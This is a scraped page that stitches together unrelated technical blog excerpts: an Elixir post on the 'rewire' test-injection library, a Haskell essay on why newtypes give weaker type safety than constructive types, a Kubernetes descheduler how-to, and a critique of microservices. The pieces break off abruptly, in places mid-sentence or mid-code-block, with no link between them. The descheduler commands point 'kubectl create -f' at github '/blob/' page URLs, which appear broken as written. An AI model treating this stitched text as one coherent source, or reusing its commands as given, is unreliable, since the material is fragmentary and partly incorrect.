</code></pre></div><div><pre><code data-lang="elixir"><span>defmodule</span> <span>MyTest</span> <span>do</span>
  <span>use</span> <span>ExUnit.Case</span><span>,</span> <span>async</span><span>:</span> <span>true</span>  <span># concurrently!</span>

  <span>import</span> <span>Rewire</span>
  <span>import</span> <span>Mox</span>

  <span>rewire</span> <span>Conversation</span><span>,</span> <span>English</span><span>:</span> <span>EnglishMock</span>  <span># inject!</span>

  <span>test</span> <span>"start/0"</span> <span>do</span>
    <span>stub</span><span>(</span><span>EnglishMock</span><span>,</span> <span>:greet</span><span>,</span> <span>fn</span> <span>-&gt;</span> <span>"g'day"</span> <span>end</span><span>)</span>
    <span>assert</span> <span>Conversation</span><span>.</span><span>start</span><span>()</span> <span>==</span> <span>"g'day"</span>
  <span>end</span>
<span>end</span>
</code></pre></div><p>By following this approach, we keep our production code completely free of testing concerns and the test can still be run concurrently!</p>
<p>You can use it with any mocking library, not just <code>mox</code>. Or just stubs you defined yourself. It only cares about dependency injection.</p>
<h2 id="ehm-but-how-does-it-work">Ehm, But How Does it Work?</h2>
<p><code>rewire</code> is a macro, imported via <code>import Rewire</code>.</p>
<p>Let’s look at what code the macro generated here:</p>
<div><pre><code data-lang="elixir"><span>defmodule</span> <span>Conversation.R518</span> <span>do</span>
  <span>def</span> <span>start</span><span>(),</span> <span>do</span><span>:</span> <span>EnglishMock</span><span>.</span><span>greet</span><span>()</span>
<span>end</span>

<span>alias</span> <span>Conversation.R518</span><span>,</span> <span>as</span><span>:</span> <span>Conversation</span>
</code></pre></div><p>First, it generates a <em>copy</em> of the original module with the <code>English</code> reference <em>replaced</em> by <code>EnglishMock</code>. You might also notice that the module name has changed. Since the module might be rewired in multiple places, this is supposed to prevent naming collisions.</p>
<p>Then, it adds an alias to the rewired module under the <em>original</em> name.</p>
<p>You might wonder how it generates a new module from the original one. The library finds the module’s source file path by calling <code>module_info</code>, parses the code into an AST with <code>Code.string_to_quoted</code>, traverses the AST to replace any rewired dependencies using <code>Macro.traverse</code> and evaluates the result with <code>Code.eval_quoted</code>. Check out the <a href="https://github.com/stephanos/rewire/blob/master/lib/rewire">source code</a> for details.</p>
<h2 id="limitation">Limitation</h2>
<p>As far as I know, the only situation where you cannot use <code>rewire</code> to inject your dependencies is when you are dealing with a process that has been started <em>before</em> your test.</p>
<p>Take for example a <a href="https://www.phoenixframework.org/">Phoenix</a> controller test. Since you’ll be writing tests against the server (using <code>ConnCase</code>), a dependency in the controller cannot be rewired after the fact.</p>
<h2 id="la-fin">La Fin</h2>

<p>Haskell programmers spend a lot of time talking about <em>type safety</em>. The Haskell school of program construction advocates “capturing invariants in the type system” and “making illegal states unrepresentable,” both of which sound like compelling goals, but are rather vague on the techniques used to achieve them. Almost exactly one year ago, I published <a href="http://lexi-lambda.github.io/blog/2019/11/05/parse-don-t-validate/">Parse, Don’t Validate</a> as an initial stab towards bridging that gap.</p>

<p>The ensuing discussions were largely productive and right-minded, but one particular source of confusion quickly became clear: Haskell’s <code>newtype</code> construct. The idea is simple enough—the <code>newtype</code> keyword declares a wrapper type, nominally distinct from but representationally equivalent to the type it wraps—and on the surface this <em>sounds</em> like a simple and straightforward path to type safety. For example, one might consider using a <code>newtype</code> declaration to define a type for an email address:</p>

<div>
 <div>
  <pre><span></span><span>newtype</span> <span>EmailAddress</span> <span>=</span> <span>EmailAddress</span> <span>Text</span>
</pre></div>

</div>

<p>This technique can provide <em>some</em> value, and when coupled with a smart constructor and an encapsulation boundary, it can even provide some safety. But it is a meaningfully distinct <em>kind</em> of type safety from the one I highlighted a year ago, one that is far weaker. On its own, a newtype is just a name.</p>

<p>And names are not type safety.</p>
<!-- more-->



<p>To illustrate the difference between constructive data modeling (discussed at length in my <a href="http://lexi-lambda.github.io/blog/2020/08/13/types-as-axioms-or-playing-god-with-static-types/">previous blog post</a>) and newtype wrappers, let’s consider an example. Suppose we want a type for “an integer between 1 and 5, inclusive.” The natural constructive modeling would be an enumeration with five cases:</p>

<div>
 <div>
  <pre><span></span><span>data</span> <span>OneToFive</span>
  <span>=</span> <span>One</span>
  <span>|</span> <span>Two</span>
  <span>|</span> <span>Three</span>
  <span>|</span> <span>Four</span>
  <span>|</span> <span>Five</span>
</pre></div>

</div>

<p>We could then write some functions to convert between <code>Int</code> and our <code>OneToFive</code> type:</p>

<div>
 <div>
  <pre><span></span><span>toOneToFive</span> <span>::</span> <span>Int</span> <span>-&gt;</span> <span>Maybe</span> <span>OneToFive</span>
<span>toOneToFive</span> <span>1</span> <span>=</span> <span>Just</span> <span>One</span>
<span>toOneToFive</span> <span>2</span> <span>=</span> <span>Just</span> <span>Two</span>
<span>toOneToFive</span> <span>3</span> <span>=</span> <span>Just</span> <span>Three</span>
<span>toOneToFive</span> <span>4</span> <span>=</span> <span>Just</span> <span>Four</span>
<span>toOneToFive</span> <span>5</span> <span>=</span> <span>Just</span> <span>Five</span>
<span>toOneToFive</span> <span>_</span> <span>=</span> <span>Nothing</span>

<span>fromOneToFive</span> <span>::</span> <span>OneToFive</span> <span>-&gt;</span> <span>Int</span>
<span>fromOneToFive</span> <span>One</span>   <span>=</span> <span>1</span>
<span>fromOneToFive</span> <span>Two</span>   <span>=</span> <span>2</span>
<span>fromOneToFive</span> <span>Three</span> <span>=</span> <span>3</span>
<span>fromOneToFive</span> <span>Four</span>  <span>=</span> <span>4</span>
<span>fromOneToFive</span> <span>Five</span>  <span>=</span> <span>5</span>
</pre></div>

</div>

<p>This would be perfectly sufficient for achieving our stated goal, but you’d be forgiven for finding it odd: it would be rather awkward to work with in practice. Because we’ve invented an entirely new type, we can’t reuse any of the usual numeric functions Haskell provides. Consequently, many programmers would gravitate towards a newtype wrapper, instead:</p>

<div>
 <div>
  <pre><span></span><span>newtype</span> <span>OneToFive</span> <span>=</span> <span>OneToFive</span> <span>Int</span>
</pre></div>

</div>

<p>Just as before, we can provide <code>toOneToFive</code> and <code>fromOneToFive</code> functions, with identical types:</p>

<div>
 <div>
  <pre><span></span><span>toOneToFive</span> <span>::</span> <span>Int</span> <span>-&gt;</span> <span>Maybe</span> <span>OneToFive</span>
<span>toOneToFive</span> <span>n</span>
  <span>|</span> <span>n</span> <span>&gt;=</span> <span>1</span> <span>&amp;&amp;</span> <span>n</span> <span>&lt;=</span> <span>5</span> <span>=</span> <span>Just</span> <span>$</span> <span>OneToFive</span> <span>n</span>
  <span>|</span> <span>otherwise</span>        <span>=</span> <span>Nothing</span>

<span>fromOneToFive</span> <span>::</span> <span>OneToFive</span> <span>-&gt;</span> <span>Int</span>
<span>fromOneToFive</span> <span>(</span><span>OneToFive</span> <span>n</span><span>)</span> <span>=</span> <span>n</span>
</pre></div>

</div>

<p>If we put these declarations in their own module and choose not to export the <code>OneToFive</code> constructor, these APIs might appear entirely interchangeable. Naïvely, it seems that the newtype version is both simpler and equally type-safe. However—perhaps surprisingly—this is not actually true.</p>

<p>To see why, suppose we write a function that consumes a <code>OneToFive</code> value as an argument. Under the constructive modeling, such a function need only pattern-match against each of the five constructors, and GHC will accept the definition as exhaustive:</p>

<div>
 <div>
  <pre><span></span><span>ordinal</span> <span>::</span> <span>OneToFive</span> <span>-&gt;</span> <span>Text</span>
<span>ordinal</span> <span>One</span>   <span>=</span> <span>"first"</span>
<span>ordinal</span> <span>Two</span>   <span>=</span> <span>"second"</span>
<span>ordinal</span> <span>Three</span> <span>=</span> <span>"third"</span>
<span>ordinal</span> <span>Four</span>  <span>=</span> <span>"fourth"</span>
<span>ordinal</span> <span>Five</span>  <span>=</span> <span>"fifth"</span>
</pre></div>

</div>

<p>The same is not true given the newtype encoding. The newtype is opaque, so the only way to observe it is to convert it back to an <code>Int</code>—after all, it <em>is</em> an <code>Int</code>. An <code>Int</code> can of course contain many other values besides <code>1</code> through <code>5</code>, so we are forced to add an error case to satisfy the exhaustiveness checker:</p>

<div>
 <div>
  <pre><span></span><span>ordinal</span> <span>::</span> <span>OneToFive</span> <span>-&gt;</span> <span>Text</span>
<span>ordinal</span> <span>n</span> <span>=</span> <span>case</span> <span>fromOneToFive</span> <span>n</span> <span>of</span>
  <span>1</span> <span>-&gt;</span> <span>"first"</span>
  <span>2</span> <span>-&gt;</span> <span>"second"</span>
  <span>3</span> <span>-&gt;</span> <span>"third"</span>
  <span>4</span> <span>-&gt;</span> <span>"fourth"</span>
  <span>5</span> <span>-&gt;</span> <span>"fifth"</span>
  <span>_</span> <span>-&gt;</span> <span>error</span> <span>"impossible: bad OneToFive value"</span>
</pre></div>

</div>

<p>In this highly contrived example, this may not seem like much of a problem to you. But it nonetheless illustrates a key difference in the guarantees afforded by the two approaches:</p>

<ul>
 <li>
  <p>The constructive datatype captures its invariants in such a way that they are <em>accessible</em> to downstream consumers. This frees our <code>ordinal</code> function from worrying about handling illegal values, as they have been made unutterable.</p></li>
 <li>
  <p>The newtype wrapper provides a smart constructor that <em>validates</em> the value, but the boolean result of that check is used only for control flow; it is not preserved in the function’s result. Accordingly, downstream consumers cannot take advantage of the restricted domain; they are functionally accepting <code>Int</code>s.</p></li></ul>

<p>Losing exhaustiveness checking might seem like small potatoes, but it absolutely is not: our use of <code>error</code> has punched a hole right through our type system. If we were to add another constructor to our <code>OneToFive</code> datatype,<sup><a href="#2020-11-01-names-are-not-type-safety-footnote-1-definition" name="2020-11-01-names-are-not-type-safety-footnote-1-return">1</a></sup> the version of <code>ordinal</code> that consumes a constructive datatype would be immediately detected non-exhaustive at compile-time, while the version that consumes a newtype wrapper would continue to compile yet fail at runtime, dropping through to the “impossible” case.</p>

<p>All of this is a consequence of the fact that the constructive modeling is <em>intrinsically</em> type-safe; that is, the safety properties are enforced by the type declaration itself. Illegal values truly are unrepresentable: there is simply no way to represent <code>6</code> using any of the five constructors. The same is not true of the newtype declaration, which has no intrinsic semantic distinction from that of an <code>Int</code>; its meaning is specified extrinsically via the <code>toOneToFive</code> smart constructor. Any semantic distinction intended by a newtype is thoroughly invisible to the type system; it exists only in the programmer’s mind.</p>

<h2 id="revisiting-non-empty-lists">Revisiting non-empty lists</h2>

<p>Our <code>OneToFive</code> datatype is rather artificial, but identical reasoning applies to other datatypes that are significantly more practical. Consider the <code>NonEmpty</code> datatype I’ve repeatedly highlighted in recent blog posts:</p>

<div>
 <div>
  <pre><span></span><span>data</span> <span>NonEmpty</span> <span>a</span> <span>=</span> <span>a</span> <span>:|</span> <span>[</span><span>a</span><span>]</span>
</pre></div>

</div>

<p>It may be illustrative to imagine a version of <code>NonEmpty</code> represented as a newtype over ordinary lists. We can use the usual smart constructor strategy to enforce the desired non-emptiness property:</p>

<div>
 <div>
  <pre><span></span><span>newtype</span> <span>NonEmpty</span> <span>a</span> <span>=</span> <span>NonEmpty</span> <span>[</span><span>a</span><span>]</span>

<span>nonEmpty</span> <span>::</span> <span>[</span><span>a</span><span>]</span> <span>-&gt;</span> <span>Maybe</span> <span>(</span><span>NonEmpty</span> <span>a</span><span>)</span>
<span>nonEmpty</span> <span>[]</span> <span>=</span> <span>Nothing</span>
<span>nonEmpty</span> <span>xs</span> <span>=</span> <span>Just</span> <span>$</span> <span>NonEmpty</span> <span>xs</span>

<span>instance</span> <span>Foldable</span> <span>NonEmpty</span> <span>where</span>
  <span>toList</span> <span>(</span><span>NonEmpty</span> <span>xs</span><span>)</span> <span>=</span> <span>xs</span>
</pre></div>

</div>

<p>Just as with <code>OneToFive</code>, we quickly discover the consequences of failing to preserve this information in the type system. Our motivating use case for <code>NonEmpty</code> was the ability to write a safe version of <code>head</code>, but the newtype version requires another assertion:</p>

<div>
 <div>
  <pre><span></span><span>head</span> <span>::</span> <span>NonEmpty</span> <span>a</span> <span>-&gt;</span> <span>a</span>
<span>head</span> <span>xs</span> <span>=</span> <span>case</span> <span>toList</span> <span>xs</span> <span>of</span>
  <span>x</span><span>:</span><span>_</span> <span>-&gt;</span> <span>x</span>
  <span>[]</span>  <span>-&gt;</span> <span>error</span> <span>"impossible: empty NonEmpty value"</span>
</pre></div>

</div>

<p>This might not seem like a big deal, since it seems unlikely such a case would ever happen. But that reasoning hinges entirely on trusting the correctness of the module that defines <code>NonEmpty</code>, while the constructive definition only requires trusting the GHC typechecker. As we generally trust that the typechecker works correctly, the latter is a much more compelling proof.</p>



<p>If you are fond of newtypes, this whole argument may seem a bit troubling. It may seem like I’m implying newtypes are scarcely better than comments, albeit comments that happen to be meaningful to the typechecker. Fortunately, the situation is not quite that grim—newtypes <em>can</em> provide a sort of safety, just a weaker one.</p>

<p>The primary safety benefit of newtypes is derived from abstraction boundaries. If a newtype’s constructor is not exported, it becomes opaque to other modules. The module that defines the newtype—its “home module”—can take advantage of this to create a <em>trust boundary</em> where internal invariants are enforced by restricting clients to a safe API.</p>

<p>We can use the <code>NonEmpty</code> example from above to illustrate how this works. We refrain from exporting the <code>NonEmpty</code> constructor, and we provide <code>head</code> and <code>tail</code> operations that we trust to never actually fail:</p>

<div>
 <div>
  <pre><span></span><span>module</span> <span>Data.List.NonEmpty.Newtype</span>
  <span>(</span> <span>NonEmpty</span>
  <span>,</span> <span>cons</span>
  <span>,</span> <span>nonEmpty</span>
  <span>,</span> <span>head</span>
  <span>,</span> <span>tail</span>
  <span>)</span> <span>where</span>

<span>newtype</span> <span>NonEmpty</span> <span>a</span> <span>=</span> <span>NonEmpty</span> <span>[</span><span>a</span><span>]</span>

<span>cons</span> <span>::</span> <span>a</span> <span>-&gt;</span> <span>[</span><span>a</span><span>]</span> <span>-&gt;</span> <span>NonEmpty</span> <span>a</span>
<span>cons</span> <span>x</span> <span>xs</span> <span>=</span> <span>NonEmpty</span> <span>(</span><span>x</span><span>:</span><span>xs</span><span>)</span>

<span>nonEmpty</span> <span>::</span> <span>[</span><span>a</span><span>]</span> <span>-&gt;</span> <span>Maybe</span> <span>(</span><span>NonEmpty</span> <span>a</span><span>)</span>
<span>nonEmpty</span> <span>[]</span> <span>=</span> <span>Nothing</span>
<span>nonEmpty</span> <span>xs</span> <span>=</span> <span>Just</span> <span>$</span> <span>NonEmpty</span> <span>xs</span>

<span>head</span> <span>::</span> <span>NonEmpty</span> <span>a</span> <span>-&gt;</span> <span>a</span>
<span>head</span> <span>(</span><span>NonEmpty</span> <span>(</span><span>x</span><span>:</span><span>_</span><span>))</span> <span>=</span> <span>x</span>
<span>head</span> <span>(</span><span>NonEmpty</span> <span>[]</span><span>)</span>    <span>=</span> <span>error</span> <span>"impossible: empty NonEmpty value"</span>

<span>tail</span> <span>::</span> <span>NonEmpty</span> <span>a</span> <span>-&gt;</span> <span>[</span><span>a</span><span>]</span>
<span>tail</span> <span>(</span><span>NonEmpty</span> <span>(</span><span>_</span><span>:</span><span>xs</span><span>))</span> <span>=</span> <span>xs</span>
<span>tail</span> <span>(</span><span>NonEmpty</span> <span>[]</span><span>)</span>     <span>=</span> <span>error</span> <span>"impossible: empty NonEmpty value"</span>
</pre></div>

</div>

<p>Since the only way to construct or consume <code>NonEmpty</code> values is to use the functions in <code>Data.List.NonEmpty.Newtype</code>’s exported API, the above implementation makes it impossible for clients to violate the non-emptiness invariant. In a sense, values of opaque newtypes are like <em>tokens</em>: the implementing module issues tokens via its constructor functions, and those tokens have no intrinsic value. The only way to do anything useful with them is to “redeem” them to the issuing module’s accessor functions, in this case <code>head</code> and <code>tail</code>, to obtain the values contained within.</p>

<p>This approach is significantly weaker than using a constructive datatype, since it is theoretically possible to screw up and accidentally provide a means to construct an invalid <code>NonEmpty []</code> value. For this reason, the newtype approach to type safety does not on its own constitute a <em>proof</em> that a desired invariant holds. However, it restricts the “surface area” where an invariant violation can occur to the defining module, so reasonable confidence the invariant really does hold can be achieved by thoroughly testing the module’s API using fuzzing or property-based testing techniques.<sup><a href="#2020-11-01-names-are-not-type-safety-footnote-2-definition" name="2020-11-01-names-are-not-type-safety-footnote-2-return">2</a></sup></p>

<p>This tradeoff may not seem all that bad, and indeed, it is often a very good one! Guaranteeing invariants using …</p></article></div></section></div>

<p>I have been working with Kubernetes for many years. In my opinion it is a super versatile and flexible system that allows us to deploy and manage applications in the cloud. You could say that the adoption of the cloud can be divided into two eras, before and after Kubernetes.</p>

<p>Since Kubernetes was born as an Open Source project, released by Google, there have been innumerable types of projects (Open Source as well) that have been born and when I say innumerable, I am very serious. The Kubernetes <a href="https://landscape.cncf.io/">Landscape</a> is gigantic, every day a new project is born and it is quite difficult for us to keep up with it. This is due to the great reception that this project has and the adoption in all types of companies that have begun to use Kubernetes as their CORE for their cloud applications.</p>

<p>One of the main drawbacks I’ve encountered over the years is getting the Kubernetes de facto scheduler <a href="https://kubernetes.io/docs/concepts/scheduling-eviction/kube-scheduler/">kube-scheduler</a> to work in a more practical way. This is difficult to achieve, as each project, company or application has its own requirements, its own workflows, and its own lyfecycle.</p>

<p>For the sake of theory, what the Kubernetes scheduler does is to watches for newly created Pods that have no Node assigned. For every Pod that the scheduler discovers, the scheduler becomes responsible for finding the best Node for that Pod to run on.</p>

<p>The scheduler’s decisions are influenced by its view of a Kubernetes cluster at that point of time when a new pod appears for scheduling. As Kubernetes clusters are very dynamic and their state changes over time, there may be desire to move already running pods to some other nodes for various reasons:</p>

<p>• Some nodes are under or over utilized.</p>

<p>• The original scheduling decision does not hold true any more, as taints or labels are added to or removed from nodes, pod/node affinity requirements are not satisfied any more.</p>

<p>• Some nodes failed and their pods moved to other nodes.</p>

<p>• New nodes are added to clusters. For instance, you upgrade the cluster and the last node has no pods running in it.</p>




<p>Kube-Scheduler is the default Kubernetes scheduler and is part of the Kubernetes control plane. Of course, and this is one of the versatility of Kubernetes, and if you want, you can write your own scheduler controller to suit your needs.</p>

<p>But let’s say you don’t have a developer with <a href="https://golang.org/">Go</a> experience and knowledge of the Kubernetes API and machinery. In fact, there are very few professionals with these skills at this time, however, we have some options that can help us correct and modify in some way the distribution of pods across the cluster.</p>

<p>A very simple tool is the <a href="https://github.com/kubernetes-sigs/descheduler">descheduler</a>. This is a controller that can be deployed to kubernetes cluster and based on its policy, finds pods that can be moved to another nodes in order to distribute the workload.</p>

<p>Let’s see how it works. As cluster administrator you have two alternatives:</p>

<ul>
  <li>Run descheduler as a Job (One time run)</li>
</ul>

<div><div><pre><code>kubectl create -f https://github.com/kubernetes-sigs/descheduler/blob/master/kubernetes/base/rbac.yaml
kubectl create -f https://github.com/kubernetes-sigs/descheduler/blob/master/kubernetes/base/configmap.yaml
kubectl create -f https://github.com/kubernetes-sigs/descheduler/blob/master/kubernetes/job/job.yaml
</code></pre></div></div>

<ul>
  <li>Run descheduler as a Cronjob (Run it periodically)</li>
</ul>

<div><div><pre><code>kubectl create -f https://github.com/kubernetes-sigs/descheduler/blob/master/kubernetes/base/rbac.yaml
kubectl create -f https://github.com/kubernetes-sigs/descheduler/blob/master/kubernetes/base/configmap.yaml
kubectl create -f https://github.com/kubernetes-sigs/descheduler/blob/master/kubernetes/cronjob/cronjob.yaml
</code></pre></div></div>

<p>That’s it, once it runs, you will notice that pods will be recreated from one node to anothers if the descheduler found out the cluster is not balanced. BE AWARE your airpods will be recreated then make sure you plan for a maintenance windows or run it in a non production environment for testing purposes as a first try.</p>



<p>In order to get the output of the descheduler job, let’t find the pods first:</p>

<p><code>kubectl get pods -A | grep -i descheduler-job</code></p>

<p>Example output:</p>

<div><div><pre><code>kubectl logs -f descheduler-job-2b45f  -n kube-system

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Some recent <a href="https://twitter.com/gergelyorosz/status/1247132806041546754" target="_blank" rel="nofollow noopener noreferrer">backtracking</a> <a href="https://twitter.com/copyconstruct/status/1247130488667394049" target="_blank" rel="nofollow noopener noreferrer">from</a> what we have been calling “Microservices” has sparked anew the debate around that software architecture pattern. It turns out that for increasingly more software people, having a backend with (<a href="https://www.infoq.com/presentations/monzo-microservices/" target="_blank" rel="nofollow noopener noreferrer">sometimes several</a>) hundreds of services wasn’t that great an idea after all. The debate has <a href="https://riak.com/posts/technical/microservices-please-dont/" target="_blank" rel="nofollow noopener noreferrer">been going on for a while</a> and much has already been said, but there are still a couple of things I’d like to say.</p>
<p><strong>TL;DR</strong> “Microservices” was a good idea taken too far and applied too bluntly. The fix isn’t just to dial back the granularity knob but instead to 1) focus on the split-join criteria as opposed to size; and 2) differentiate between the project model and the deployment model when applying them.</p>
<p>I explain. Allow me to rant a bit first.</p>


<p>There were three main reasons for the initial success of <em>microservices</em> as an architectural pattern for software: 1) forced modularisation, 2) weakened dependencies, and 3) an excuse for having no architecture. In order:</p>
<ol>
<li>In the monoliths of old, you could in theory enforce module boundaries. You could say that your <code>acme-helpers</code> or <code>acme-data-tools</code> could not depend on <code>acme-domain</code>, say, and you even had some tooling to enforce that, but it was fallible. Especially in big companies where these monoliths spanned more than a team’s cognitive horizon, violations of those boundaries were often a simple <code>import</code> away, and of course rife. Angry architects saw in microservices the promise of making those a thing of the past: now the developer is forced to only deal with the API. Codebases parted ways and calls were made to go down the network stack and back.</li>
<li>
<p>So then, one wouldn’t depend on a fellow service at build time, only at runtime. Great. Method calls became http calls. “Now we don’t need to care about dependencies” — actual people said this, as if the dependency wasn’t fundamental and instead just an accidental artifact of the build setup. Everybody brushed up on their HTTP and different server and client implementations, read all about REST and Soap (and RPC, RMI and CORBA while at it) and merrily created a layer of indirection between modules — now <em>services</em> — that was <em>very</em> loose. Typed APIs, granular network policies and contract testing came much later.</p>
<p>It felt liberating until the complexities of API versioning, delivery semantics, error propagation, distributed transaction management and the sprawl of client code in all callers of a service began to show up. This was a gigantic <strong>shift right</strong>, but hey, the build process was simpler.</p>
</li>

<p>More insidious perhaps was the validation that “doing microservices” brought to organisations that lacked a thesis about how their architecture should be. There was now a sanctioned answer to most architectural dilemmas: another microservice. Another entry in the service catalog for any and all interested parties to call. This ecology of interacting parties, each acting in their own interest for the common good spoke to an underlying, tacit belief that the emergent mesh of services would approximate the latent natural architecture of the domain.</p>
<p>So soft and convenient was the lure of not having to draw hard architectural lines that we got lazy where we weren’t and accepted our lazyness where we already were. If you didn’t subscribe to that belief, the problem was you and your lack of understanding of complex systems, you objectivist cretin.</p>
</li>
</ol>
<p>Yes, there was real pain in managing monoliths and sure, many systems were too monolithic (i.e. had deployables too large) but the zealotry of a newfound purity swung the pendulum too far, as they always do. Not only do we not need to run so many services so small, we also don’t benefit from isolating their codebases so much. To summarise:</p>
<ol>
<li>having a big flat permissive build is no good reason to split deployables;</li>
<li>weakening dependencies between different parts of our systems is a “shift-right” loan with high interest; and</li>
<li>having a ready answer when the thinking gets tough is a soothing lie that just moves complexity about. There is no substitute to the effortful application of cognitive power to a problem.</li>
</ol>

<p>Two things: focus on the right criteria for splitting a service instead of on its size, and apply those criteria more thoughtfully.</p>
<h2 id="size-is-not-the-answer"><a href="#size-is-not-the-answer" aria-label="size is not the answer permalink"></a>Size is not the answer</h2>
<p>The <em>micro</em> in microservices ought to be at best a prediction, never a goal. We may predict services <em>will be</em> micro but they don’t <em>have to be</em>. <a href="https://kalele.io/microservices-and-microservices/" target="_blank" rel="nofollow noopener noreferrer">Vaugh Vernon is right</a> when he speaks about “cohesion for a reason”.</p>
<p>There should be no prescribed <em>a priori</em> granularity of services. There <em>is</em> no prescribed size of a service. There are instead <strong>good and bad reasons to split</strong> parts of a software system.</p>
<p>So the heuristic is:</p>
<div data-language="text"><pre><code>                      Start one, split with a reason.</code></pre></div>
<p>Conversely, if a reason ceases to exist, consider joining them.</p>
<h2 id="the-missing-hinge"><a href="#the-missing-hinge" aria-label="the missing hinge permalink"></a>The missing hinge</h2>
<p>There are however different realms in which “software systems” exist: they exist both as artifacts we interact with and as artifacts computers interact with. Code and binary. We organise them in different ways: the <strong>project model</strong> (repositories, projects, modules and their dependencies) and the <strong>deployment model</strong> (what production environments look like and how deployables run in them).</p>

<p>In the process of going from coarse to granular (i.e. from monolith to microservices) however, little attention was paid to the difference — and possible indirection — between those two models. The hammer hit both fairly indiscriminately and made us split codebases because of runtime concerns and split deployables due to project concerns.</p>

<p>Much like stiffness in a part of the human spine can result in pain in another, <strong>stiffness in our build DAGs is causing excessive mirroring between our project and deployment models</strong>; between our repositories and our services; between the way we organise our code and the way our services run. That mirroring is on the one hand preventing us from shifting left concerns about the relationships between modules that have often been made weak and fragile runtime dependencies, while on the other hand encouraging us to have more services than what the runtime reality would call for. That brings pain.</p>

<p>Central to resolving this stiffness is the realisation that the build flow, at least conceptually, is a DAG – Directed Acyclic Graph – where the nodes are <em>jobs</em> and <em>versioned artifacts</em> and the edges connect either a job to a versioned artifact (“produces”) or a versioned artifact to a jobs (“dependency_of”). Deployables are by definition the versioned artifacts that are consumed by the deployment jobs.</p>

<p>For too long we overlooked how much a flexible and frictionless build DAG allows us to improve our architecture on both sides. With moderately rich build patterns we can have our code where its intent is clearer and more constraints can be validated at build time and still have it deployed into its simplest viable form, running where its execution is cheaper, faster and safer.</p>

<p>I’m not sure what the historically accurate account is that would explain the excessive simplicity of build patterns across the industry. I do know from experience that too many practices make do with very simple and linear flows where one repository builds independently one and only one service. Regardless of the legitimate argument about code duplication and its tradeoffs, there seems to be an aversion to build-time internal dependencies, even when these bring in clearly desirable data or logic such as message format definitions.</p>
<p>I suspect it might have something to do with how very few CI tools support composition natively (i.e. the outputs of jobs being able to be the inputs of others), how fallible semantic versioning in practice is and the difficulty of automating deterministic version propagation.</p>
<p>By that I mean keeping local copies in sync with CI, builds repeatable, and new upstream versions automatically used by their downstream dependents. It isn’t trivial and requires some versioning and build-fu that, to my knowledge, most practices end up shortcutting to either sacrifice repeatability by using <code>latest</code> or stifling the flow by requiring repeated manual work. Hence the pressure to have a simple build setup.</p>
<p>The exact cause is unimportant though. What is important is that overcoming this is crucial.</p>

<p>Many criteria for splitting or joining software systems, ranging from the social (teams, bounded contexts) to the mechanical (cpu or io boundedness) have been put forth, and they all make some form of sense. However, most of them are either a good reason to split projects or modules, or a good reason to split deployables, rarely both. Keeping that in mind will help us apply them more effectively.</p>
<p>Below are a few possible criteria and some comments about their application. I’m not trying to be exhaustive, just illustrating the kind of reasoning makes sense to me.</p>
<h2 id="runtime-deployment-side-criteria"><a href="#runtime-deployment-side-criteria" aria-label="runtime deployment side criteria permalink"></a>Runtime, deployment side criteria</h2>
<ul>
<li><strong>Different Runtime</strong> – If a part of the codebase compiles to a different runtime it becomes a different deployable and we call it a different service.</li>
<li><strong>Elasticity Profile</strong> – Some parts of the system may have a spikier load profile. It might pay off to have them scale in and out separately from the rest.</li>
<li><strong>Load Type</strong> – Some parts of a generally latency-oriented io-bound system may generate occasional peaks of cpu-bound load which can hurt response times. It might be better to put them in a …</li></ul></div></div>
